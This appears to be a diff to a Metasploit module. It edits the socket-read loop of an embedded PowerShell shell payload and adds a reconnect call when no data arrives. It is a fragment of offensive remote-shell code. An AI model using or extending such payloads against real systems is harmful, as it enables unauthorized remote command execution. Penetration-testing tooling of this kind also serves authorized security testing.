@@ -81,7 +81,8 @@ module MetasploitModule
           "while (($i -gt 0) -and ($pos -lt $nb.Length)) {"\
             "$r=$s.Read($nb,$pos,$nb.Length - $pos);"\
             "$pos+=$r;"\
-            "if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}};"\
+            "if (-not $pos -or $pos -eq 0) {RSC};"\
+            "if ($nb[0..$($pos-1)] -contains 10) {break}};"\
             "if ($pos -gt 0){"\
               "$str=$e.GetString($nb,0,$pos);"\
               "$is.write($str);start-sleep 1;"\
